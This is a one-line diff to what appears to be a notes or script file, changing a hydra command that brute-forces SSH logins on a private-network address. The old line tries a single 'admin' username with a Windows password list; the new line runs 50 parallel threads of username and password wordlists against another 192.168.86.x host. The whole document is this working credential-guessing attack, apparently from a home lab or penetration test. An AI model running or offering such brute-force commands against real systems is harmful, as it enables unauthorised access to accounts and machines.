@@ -1,2 +1,2 @@
-hydra -t 50 -V -f -s 25 -l admin -P common-passwords-win.txt ssh://192.168.86.118
+hydra -t 50 -V -f -L top-usernames-shortlist.txt -P 10-million-password-list-top-1000.txt ssh://192.168.86.242
 
